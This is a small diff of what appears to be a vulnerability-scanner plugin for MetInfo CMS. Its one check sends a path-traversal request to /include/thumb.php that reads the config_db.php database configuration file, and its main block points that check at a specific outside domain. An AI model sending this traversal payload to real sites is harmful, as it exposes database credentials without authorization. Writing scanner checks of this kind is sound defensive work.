@@ -13,5 +13,5 @@ def audit(arg):
         security_hole(url + '/include/thumb.php?x=1&y=/../../../config&dir=config_db.php')
 
 if __name__ == '__main__':
-    from dummy import *
+
     audit(assign('metinfo', 'http://www.158185187.com/')[1])
